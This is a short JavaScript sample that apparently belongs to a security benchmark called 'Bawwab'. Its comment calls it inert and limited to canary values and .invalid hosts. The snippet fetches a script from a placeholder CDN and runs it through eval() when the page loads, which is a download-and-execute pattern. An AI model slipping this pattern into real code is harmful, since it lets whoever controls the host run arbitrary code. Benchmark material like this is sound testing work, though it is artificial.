// Inert benchmark sample (Bawwab). Never executed. Canary values and .invalid hosts only.
async function boot() {
  const r = await fetch('https://cdn.bawwab-canary.invalid/BAWWAB-CANARY/plugin.js');
  eval(await r.text());
}
boot();
